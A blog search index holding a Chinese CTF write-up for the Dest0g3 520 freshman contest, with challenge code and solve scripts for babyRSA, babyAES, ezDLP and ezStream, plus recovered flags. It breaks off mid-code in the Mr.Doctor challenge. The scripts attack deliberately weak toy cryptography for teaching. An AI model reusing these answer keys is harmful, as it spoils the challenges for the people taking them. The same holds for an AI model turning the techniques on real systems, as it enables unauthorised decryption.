<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <link href="/2022/05/27/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <url>/2022/05/27/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>BUU的Dest0g3 520迎新赛。babyRSA、babyAES、ezDLP、ezStream、Mr.Doctor、Pngenius、EasyEncode、你知道js吗、EasyWord、Python_jail、 4096、simpleXOR、hi 、 ez_arrch的题解。</p><span id="more"></span><img src="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg" style="zoom: 33%;" /><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = next_prime(p)<br>n = p*q<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>m = bytes_to_long(flag)<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span><br><span class="hljs-string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>p,q使用的是相邻的两个素数。所以可以进行开方求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># babyRSA_solve.py</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span><br>c = <span class="hljs-number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span><br>p =  sympy.prevprime(gmpy2.iroot(n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br>q = sympy.nextprime(p)<br><br>d = gmpy2.invert(<span class="hljs-number">65537</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>m = gmpy2.powmod(c, d, n)<br><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br><span class="hljs-comment"># Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;</span><br></code></pre></td></tr></table></figure><h2 id="babyaes"><a class="markdownIt-Anchor" href="#babyaes"></a> babyAES</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br>iv = os.urandom(<span class="hljs-number">16</span>)<br>key = os.urandom(<span class="hljs-number">16</span>)<br>my_aes = AES.new(key, AES.MODE_CBC, iv)<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>flag += (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(flag) % <span class="hljs-number">16</span>) * <span class="hljs-string">b&#x27;\x00&#x27;</span><br>c = my_aes.encrypt(flag)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(iv)<br><span class="hljs-built_in">print</span>(key)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span><br><span class="hljs-string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span><br><span class="hljs-string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>可以看到初始向量和加密密钥都给出来了，直接进行解密就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># babyAES_solve.py</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><br>aes = AES.new(<span class="hljs-string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span>, AES.MODE_CBC, <span class="hljs-string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(aes.decrypt(<span class="hljs-string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span>))<br><br><span class="hljs-comment"># Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ezdlp"><a class="markdownIt-Anchor" href="#ezdlp"></a> ezDLP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>x = bytes_to_long(flag)<br>g = <span class="hljs-number">19</span><br>p = <span class="hljs-number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span><br>h = <span class="hljs-built_in">pow</span>(g, x, p)<br><span class="hljs-built_in">print</span>(h)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>用SageMath求解即可。这个只能这么做了，用到应该是BSGS算法，我自己写的跑半天跑不出来，还是用SageMath好了。</p><p><a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SageMath"># sagemath<br>h = 199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162<br>p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353<br>g = 19<br>x = discrete_log(mod(h, p), mod(g, p))<br>print(hex(x))<br><br># 0x446573743067337b30376564326136662d313832662d613035642d633831652d3133313861663832306137387d<br># Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;<br></code></pre></td></tr></table></figure><h2 id="ezstream"><a class="markdownIt-Anchor" href="#ezstream"></a> ezStream</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>flag = f.read()<br>f.close()<br><span class="hljs-keyword">assert</span> flag[:<span class="hljs-number">8</span>] == <span class="hljs-string">&quot;Dest0g3&#123;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = getRandomNBitInteger(<span class="hljs-number">32</span>)<br>        self.b = getRandomNBitInteger(<span class="hljs-number">32</span>)<br>        self.m = getPrime(<span class="hljs-number">32</span>)<br>        self.seed = getRandomNBitInteger(<span class="hljs-number">32</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.a * self.seed + self.b) % self.m<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.a, self.b, self.m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br><br><br>lcg = LCG()<br>lcg.output()<br>c = <span class="hljs-string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="hljs-built_in">ord</span>(flag[i]) ^ (lcg.<span class="hljs-built_in">next</span>() % <span class="hljs-number">10</span>))<br>              <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))])<br><span class="hljs-built_in">print</span>(bytes_to_long(c))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">a = 3939333498</span><br><span class="hljs-string">b = 3662432446</span><br><span class="hljs-string">m = 2271373817</span><br><span class="hljs-string">state1 = 17362</span><br><span class="hljs-string">state2 = 20624</span><br><span class="hljs-string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>流加密，看样子要找seed的初值。而且给了一部分的明文，可以求密钥流。</p><p>随机数是用getRandomNBitInteger(32)生成的。那么seed的范围就是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mn>32</mn><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{32-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>~<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。选择爆破来求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = <span class="hljs-number">3939333498</span><br>        self.b = <span class="hljs-number">3662432446</span><br>        self.m = <span class="hljs-number">2271373817</span><br>        self.seed = getRandomNBitInteger(<span class="hljs-number">32</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.a * self.seed + self.b) % self.m<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.a, self.b, self.m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br><br><br>flag = <span class="hljs-number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br>flag = libnum.n2s(flag)<br>lcg = LCG()<br><br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**(<span class="hljs-number">32</span>-<span class="hljs-number">1</span>), <span class="hljs-number">2</span>**<span class="hljs-number">32</span> -<span class="hljs-number">1</span>):<br>    lcg.seed = seed<br>    <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">17362</span>:<br>        <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">20624</span>:<br>            lcg.seed = seed<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;seed = &quot;</span>, seed)<br>            <span class="hljs-keyword">break</span><br><br>lcg.<span class="hljs-built_in">next</span>()<br>lcg.<span class="hljs-built_in">next</span>()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(flag[i]^(lcg.<span class="hljs-built_in">next</span>()%<span class="hljs-number">10</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]))<br><br><span class="hljs-comment"># seed =  2376358340</span><br><span class="hljs-comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br></code></pre></td></tr></table></figure><p>这里我选择的是第一个成功的来作为seed。跑的话大概三分钟跑到这。还好这题第一个就是正确的解。如果解在后面的话，又得重新跑了。不过想要遍历整个 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mn>32</mn><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{32-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>~<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>空间还是挺困难的。</p><p>在做Mr.Doctor的时候发现有更简单的解法。</p><p>我们去遍历损失的那16位数据即可。这个搜索空间可比之前的小的多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br>flag = libnum.n2s(flag)<br>lcg = LCG()<br><br>likeSeed = []<br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">16</span>):<br>    lcg.seed = (<span class="hljs-number">17362</span> &lt;&lt; <span class="hljs-number">16</span>) + seed<br>    <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">20624</span>:<br>        likeSeed.append((<span class="hljs-number">17362</span> &lt;&lt; <span class="hljs-number">16</span>) + seed)<br>        <span class="hljs-built_in">print</span>(likeSeed[-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> likeSeed:<br>    lcg.seed = i<br>    lcg.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(flag[i]^(lcg.<span class="hljs-built_in">next</span>()%<span class="hljs-number">10</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]))<br>    <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1137839988</span><br><span class="hljs-string">1137855425</span><br><span class="hljs-string">1137870862</span><br><span class="hljs-string">Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|</span><br><span class="hljs-string">Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;</span><br><span class="hljs-string">Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br></code></pre></td></tr></table></figure><p>由于跑出来的结果并不止一个所以都进行运算即可。</p><h2 id="mrdoctor"><a class="markdownIt-Anchor" href="#mrdoctor"></a> Mr.Doctor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> string<br><br>table = string.ascii_letters + string.digits<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>]<br>seed = getRandomNBitInteger(<span class="hljs-number">40</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SHA256</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.proof = []<br>        self.sha = <span class="hljs-number">0</span><br>        self.sha_flag = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encryption</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span 